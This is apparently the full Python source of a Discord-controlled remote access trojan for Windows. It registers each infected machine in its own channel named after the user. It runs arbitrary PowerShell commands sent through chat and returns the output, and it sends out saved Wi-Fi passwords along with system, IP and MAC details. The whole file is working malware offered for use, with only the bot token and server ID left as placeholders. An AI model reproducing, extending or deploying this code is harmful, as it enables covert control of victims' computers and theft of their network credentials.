import os
import discord
import asyncio
import subprocess
import platform
import psutil
import socket
import uuid
from discord.ext import commands

# Setting const (a constant cant be changed in runtime)
TOKEN = "BOT TOKEN" # Discord bot token
USERNAME = os.getenv("USERNAME")  # Windows username
GUILD_ID = "12345678"  # Replace with your actual server ID

# Bot setup with proper intents (intents = the rights the discord bot has)
intents = discord.Intents.default()
intents.messages = True  # Required for reading messages
intents.message_content = True # Allows the bot to read message content from discord channel
intents.guilds = True # # Enables interaction with guilds (discord server)

# Setting the prifix to recieve commands
bot = commands.Bot(command_prefix='!', intents=intents)

# Function to get the local machine's IP address
# Note! it gets private ip make it so it will also get public
def get_ip_address():
    try:
        hostname = socket.gethostname() # Get the hostname of the machine
        ip_address = socket.gethostbyname(hostname) # Get the IP address associated with the hostname
        return ip_address
    except Exception as e: # error handling for the get_ip_address function
        return f"Error getting IP address: {e}"

# Gets local machine's mac-address
def get_mac_address():
    try:
        # Getting mac-address using the uuid lib
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
        return mac
    except Exception as e: # error handling for getting the mac-address
        return f"Error getting MAC address: {e}"

async def main_loop():
    """Main loop of the program"""
    while True:
        print("Hallo")
        await asyncio.sleep(5)  # Wait for 5 seconds

@bot.command()
async def what(ctx):
    commands = "**whoami**-(get current user who is running at this moment)\n**send_message**-(make the bot send a message)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**getsysinfo**-(get important system info)\n**stopbot**-(You know what this does)"
    await ctx.send(commands)

@bot.command()
async def whoami(ctx):
    """Sends a greeting message"""
    await ctx.send(f"I am: {USERNAME} 👋")

@bot.command()
async def send_message(ctx, *, message: str):
    """Send a custom message in the current channel"""
    await ctx.send(f"Sending message: {message}")

@bot.command()
async def ps(ctx, *, code: str):
    """Executes PowerShell code and sends the output to the webhook."""
    
    try:
        # Ensure code is wrapped properly for execution
        # This will pass the PowerShell command as a single string to the PowerShell process
        process = await asyncio.create_subprocess_exec(
            'powershell', '-NoProfile', '-Command', code,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Capture the standard output and error
        stdout, stderr = await process.communicate()

        # Decode the byte output to string
        output = stdout.decode('utf-8').strip()
        error = stderr.decode('utf-8').strip()

        # Prepare the final message with either the output or error
        if output:
            result_message = f"**Output:**\n{output}"
        elif error:
            result_message = f"**Error:**\n{error}"
        else:
            result_message = "No output or error from the PowerShell command."

        # Send the result to the bot
        await ctx.send(result_message)
    
    except Exception as e:
        await ctx.send(f"❌ Error executing PowerShell command: {str(e)}")

@bot.command()
async def stopbot(ctx):
    """Stops the bot."""
    await ctx.send("Shutting down the bot...")
    await bot.close()


@bot.command()
async def getwifipass(ctx):
    try:
        wifi_profiles = {}
        if platform.system() == "Windows":
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
            profiles = [line.split(":")[-1].strip() for line in result.splitlines() if "All User Profile" in line]
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True)
                    for line in profile_info.splitlines():
                        if "Key Content" in line:
                            wifi_profiles[profile] = line.split(":")[-1].strip()
                            break
                    else:
                        wifi_profiles[profile] = None
                except subprocess.CalledProcessError:
                    wifi_profiles[profile] = None
        await ctx.send(wifi_profiles)
    except Exception as e:
        return {"Error": f"Error getting all Wi-Fi profiles: {e}"}

@bot.command()
async def getsysinfo(ctx):
    try:
        system_info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "OS Release": platform.release(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "CPU Cores": psutil.cpu_count(logical=False),
            "Logical CPUs": psutil.cpu_count(logical=True),
            "Memory": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
            "GPU": None,
            "IP_address": get_ip_address(),
            "mac-address": get_mac_address()
        }
        try:
            result = subprocess.check_output("wmic path win32_videocontroller get caption", shell=True, text=True)
            system_info["GPU"] = result.split("\n")[1].strip()
        except Exception:
            system_info["GPU"] = "Could not retrieve GPU information"
        await ctx.send(system_info)
    except Exception as e:
        return {"Error": f"Error getting system info: {e}"}

@bot.event
async def on_ready():
    print(f'✅ Bot connected as {bot.user}')
    
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("❌ Error: Bot is not in the specified guild or missing permissions.")
        return
    
    print(f'✅ Bot found guild: {guild.name} ({guild.id})')

    # Find or create a text channel based on the username
    channel = discord.utils.get(guild.channels, name=f"{USERNAME}")

    if not channel:
        channel = await guild.create_text_channel(f"{USERNAME}")
        print(f"✅ Created channel: {channel.name}")

    await channel.send(f"{USERNAME} is online ✅")
    print(f"✅ {USERNAME} sent a message.")

    # Start the main loop
    bot.loop.create_task(main_loop())

@bot.event
async def on_disconnect():
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("❌ Error: Bot is not in the specified guild or missing permissions.")
        return
    
    print(f'✅ Bot found guild: {guild.name} ({guild.id})')
    channel = discord.utils.get(guild.channels, name=f"{USERNAME}")
    if channel:
        await channel.send("The bot has gone offline! ❌")
    else:
        print("Unable to find the specified channel.")

# Run the bot securely
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ Bot token is missing! Set the DISCORD_BOT_TOKEN environment variable.")
